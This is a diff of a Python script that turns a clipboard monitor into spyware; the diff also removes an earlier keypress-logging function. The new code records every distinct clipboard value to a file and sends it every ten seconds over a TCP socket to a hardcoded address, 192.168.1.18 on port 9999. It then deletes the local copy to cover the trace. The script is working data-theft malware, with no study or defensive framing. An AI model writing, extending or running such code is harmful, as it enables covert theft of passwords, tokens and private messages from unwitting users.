@@ -2,8 +2,12 @@ import pyperclip
 import time
 from pynput import keyboard
 import os
+import datetime
+import socket
 
-def copy_paste():
+
+ip = "192.168.1.18"
+def copy_paste(a):
     list = []
     while True:    
         if pyperclip.paste() != 'None':
@@ -11,30 +15,48 @@ def copy_paste():
             print( pyperclip.paste())
             if value not in list:            
                 list.append(value)
-            print (list) 
-            time.sleep(4)
-            f = open('paste.txt','w')
-            for ele in list:
-              f.write(ele+'\n')
-            f.close()
+            print (list)
+            time.sleep(2)
+            b= datetime.datetime.now().time()
+            if (b > a):
+                print("yes")
+                write(list)
+                a = datetime.datetime.now().time()
+                sendFile()
+                a= addSecs(a,10)
+            
+def addSecs(tm, secs):
+    fulldate = datetime.datetime(100, 1, 1, tm.hour, tm.minute, tm.second)
+    fulldate = fulldate + datetime.timedelta(seconds=secs)
+    return fulldate.time()
 
-def get_key_name(key):
-    if isinstance(key,keyboard.KeyCode):
-        return key.char
-    else:
-        return str(key)
-    
-def on_press(key):
-    key_name = get_key_name(key)
-    list.append(key_name)
-    f = open('keyPressed.txt','w')
+def write(list):
+    f = open('paste.txt','w')
     for ele in list:
-          f.write(ele)
+      f.write(ele+'\n')
     f.close()
-    print("Key {} pressed".format(key_name))
-    print("Key type: {}".format(key.__class__.__name__))
 
+def remove_file():
+	if os.path.exists('paste.txt'):
+		os.remove('paste.txt')
+
+def sendFile():
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	
+	s.connect((ip, 9999))
+	with open('paste.txt', 'rb') as file:
+		s.send("Get checker file".encode('ascii'))
+		l = file.read(1024)
+		while (l):
+			s.send(l)
+			l = file.read(1024)
+
+	remove_file()
+
+	print("Le fichier a été correctement copié et effacer ")
 
 
 if __name__ == "__main__":
-      copy_paste()
+      a = datetime.datetime.now().time()
+      a= addSecs(a,10)
+      copy_paste(a)
